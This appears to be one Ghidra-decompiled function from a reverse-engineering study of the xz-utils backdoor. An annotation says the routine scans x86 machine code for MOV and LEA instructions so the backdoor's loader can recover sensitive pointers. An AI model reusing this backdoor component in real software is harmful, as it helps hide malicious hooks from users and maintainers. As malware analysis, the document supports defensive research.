// /home/kali/xzre-ghidra/xzregh/100D40_find_mov_lea_instruction.c
// Function: find_mov_lea_instruction @ 0x100D40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_lea_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


/*
 * AutoDoc: Iterates through MOV and LEA instructions that move pointers into registers, honouring load/store direction flags. The loader uses it to chase GOT writes and frame setups when it has to recover sensitive pointers for the backdoor context.
 */
#include "xzre_types.h"


BOOL find_mov_lea_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  int iVar1;
  BOOL BVar2;
  long lVar3;
  dasm_ctx_t *pdVar4;
  BOOL opcode_matches_direction;
  dasm_ctx_t local_80;
  
  pdVar4 = &local_80;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)&pdVar4->instruction = 0;
    pdVar4 = (dasm_ctx_t *)((long)&pdVar4->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &local_80;
  }
  do {
    while( TRUE ) {
      if (code_end <= code_start) {
        return FALSE;
      }
      BVar2 = x86_dasm(dctx,code_start,code_end);
      if (BVar2 != FALSE) break;
      code_start = code_start + 1;
    }
    if ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) &&
       (((((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48) == is_64bit_operand ||
        (load_flag == FALSE)))) {
      iVar1 = *(int *)(dctx->opcode_window + 3);
      if (iVar1 == 0x10d) {
        return TRUE;
      }
      if (load_flag == FALSE) {
        opcode_matches_direction = iVar1 == 0x109;
      }
      else {
        opcode_matches_direction = iVar1 == 0x10b;
      }
      if (opcode_matches_direction) {
        return TRUE;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( TRUE );
}

